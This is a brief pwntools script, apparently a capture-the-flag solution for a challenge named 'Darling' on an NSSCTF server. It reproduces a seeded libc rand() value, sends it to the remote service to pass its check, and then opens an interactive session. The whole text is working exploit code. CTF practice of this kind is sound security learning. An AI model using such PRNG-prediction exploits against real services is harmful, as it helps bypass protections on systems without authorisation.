from pwn import *
from ctypes import *

#io = process("./Darling")

io = remote("node5.anna.nssctf.cn", 24624)
c_func = CDLL("/usr/lib/libc.so.6")

c_func.srand(20020819)
payload = str(c_func.rand() % 100 - 64).encode()
io.sendline(payload)
io.interactive()
